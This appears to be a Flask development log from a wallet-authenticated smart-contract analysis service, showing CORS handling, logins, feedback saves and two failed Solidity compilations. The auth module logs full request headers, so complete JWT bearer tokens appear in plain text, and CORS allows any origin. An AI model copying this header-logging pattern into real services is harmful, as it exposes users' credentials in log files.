2025-06-23 06:03:21,692 - flask_cors.extension - DEBUG - Request to ''/feedback'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 06:03:21,703 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 06:03:21,708 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 06:03:21,713 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization, content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-23 06:03:21,716 - werkzeug - INFO - 172.19.0.1 - - [23/Jun/2025 06:03:21] "OPTIONS /feedback HTTP/1.1" 200 -
2025-06-23 06:03:21,731 - app.api.feedback - INFO - R√©ception d'un retour depuis le portefeuille: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 06:03:21,783 - app.api.feedback - INFO - Retour sauvegard√© avec ID: 2, statut: OK, poids de la requ√™te: 2.0
2025-06-23 06:03:21,785 - flask_cors.extension - DEBUG - Request to ''/feedback'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 06:03:21,787 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 06:03:21,788 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 06:03:21,790 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 06:03:21,792 - werkzeug - INFO - 172.19.0.1 - - [23/Jun/2025 06:03:21] "POST /feedback HTTP/1.1" 200 -
2025-06-23 06:05:48,477 - app.api.feedback - INFO - R√©ception d'un retour depuis le portefeuille: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 06:05:48,529 - app.api.feedback - INFO - Retour sauvegard√© avec ID: 3, statut: KO, poids de la requ√™te: 0.0
2025-06-23 06:05:48,532 - flask_cors.extension - DEBUG - Request to ''/feedback'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 06:05:48,534 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 06:05:48,535 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 06:05:48,536 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 06:05:48,539 - werkzeug - INFO - 172.19.0.1 - - [23/Jun/2025 06:05:48] "POST /feedback HTTP/1.1" 200 -
2025-06-23 07:19:46,353 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-06-23 07:19:46,512 - app.app - INFO - Application started
2025-06-23 07:19:46,522 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.20.0.5:8000
2025-06-23 07:19:46,523 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-23 07:23:30,794 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 07:23:30,812 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 07:23:30,818 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 07:23:30,822 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization, content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-23 07:23:30,831 - werkzeug - INFO - 172.20.0.1 - - [23/Jun/2025 07:23:30] "OPTIONS /login HTTP/1.1" 200 -
2025-06-23 07:23:30,850 - app.api.auth - INFO - Received login request with method: POST
2025-06-23 07:23:30,855 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTA2NjIxNDl9.-nTDx_b3SE1ZoGCC2ZXg9LoutTVhgWdUVZXbz8OE-0g', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Content-Length': '79', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-06-23 07:23:30,857 - app.api.auth - INFO - Request content type: application/json
2025-06-23 07:23:30,858 - app.api.auth - INFO - Processing JSON request
2025-06-23 07:23:30,861 - app.api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 07:23:31,326 - app.api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 07:23:31,329 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 07:23:31,330 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 07:23:31,331 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 07:23:31,334 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 07:23:31,336 - werkzeug - INFO - 172.20.0.1 - - [23/Jun/2025 07:23:31] "POST /login HTTP/1.1" 200 -
2025-06-23 07:23:35,066 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 07:23:35,069 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 07:23:35,073 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 07:23:35,075 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-23 07:23:35,077 - werkzeug - INFO - 172.20.0.1 - - [23/Jun/2025 07:23:35] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-23 07:23:35,091 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 07:23:35,100 - app.api.contract - INFO - Analyzing code snippet
2025-06-23 07:23:35,105 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-23 07:23:35,110 - app.services.contract_service - INFO - Created temporary file for contract code: /tmp/tmp5jeiazsi.sol
2025-06-23 07:23:35,127 - app.services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-06-23 07:23:35,130 - app.services.contract_service - INFO - Compiling contract...
2025-06-23 07:23:35,141 - app.services.contract_service - INFO - Compilation result: 0 contracts compiled
2025-06-23 07:23:35,142 - app.services.contract_service - WARNING - No contracts compiled
2025-06-23 07:23:35,143 - app.services.contract_service - INFO - Temporary file /tmp/tmp5jeiazsi.sol removed
2025-06-23 07:23:35,145 - app.api.contract - WARNING - No valid Solidity contract found in the provided code
2025-06-23 07:23:35,148 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 07:23:35,150 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 07:23:35,151 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 07:23:35,152 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 07:23:35,153 - werkzeug - INFO - 172.20.0.1 - - [23/Jun/2025 07:23:35] "[31m[1mPOST /analyze HTTP/1.1[0m" 400 -
2025-06-23 07:26:54,251 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-06-23 07:26:54,504 - app.app - INFO - Application started
2025-06-23 07:26:54,517 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.23.0.5:8000
2025-06-23 07:26:54,519 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-23 07:26:59,862 - app.api.auth - INFO - Received login request with method: POST
2025-06-23 07:26:59,865 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTA2NjcwMTF9.2zJvSunSulvsCyB62Eu-56nJ9uI6f1Jl4cKllxePfh0', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Content-Length': '79', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-06-23 07:26:59,867 - app.api.auth - INFO - Request content type: application/json
2025-06-23 07:26:59,868 - app.api.auth - INFO - Processing JSON request
2025-06-23 07:26:59,870 - app.api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 07:27:00,318 - app.api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 07:27:00,322 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 07:27:00,324 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 07:27:00,326 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 07:27:00,328 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 07:27:00,332 - werkzeug - INFO - 172.23.0.1 - - [23/Jun/2025 07:27:00] "POST /login HTTP/1.1" 200 -
2025-06-23 07:27:03,364 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 07:27:03,379 - app.api.contract - INFO - Analyzing code snippet
2025-06-23 07:27:03,389 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-23 07:27:03,394 - app.services.contract_service - INFO - Created temporary file for contract code: /tmp/tmpqw3arb_m.sol
2025-06-23 07:27:03,403 - app.services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-06-23 07:27:03,405 - app.services.contract_service - INFO - Compiling contract...
2025-06-23 07:27:03,416 - app.services.contract_service - INFO - Compilation result: 0 contracts compiled
2025-06-23 07:27:03,418 - app.services.contract_service - WARNING - No contracts compiled
2025-06-23 07:27:03,419 - app.services.contract_service - INFO - Temporary file /tmp/tmpqw3arb_m.sol removed
2025-06-23 07:27:03,420 - app.api.contract - WARNING - No valid Solidity contract found in the provided code
2025-06-23 07:27:03,422 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 07:27:03,423 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 07:27:03,424 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 07:27:03,426 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 07:27:03,428 - werkzeug - INFO - 172.23.0.1 - - [23/Jun/2025 07:27:03] "[31m[1mPOST /analyze HTTP/1.1[0m" 400 -
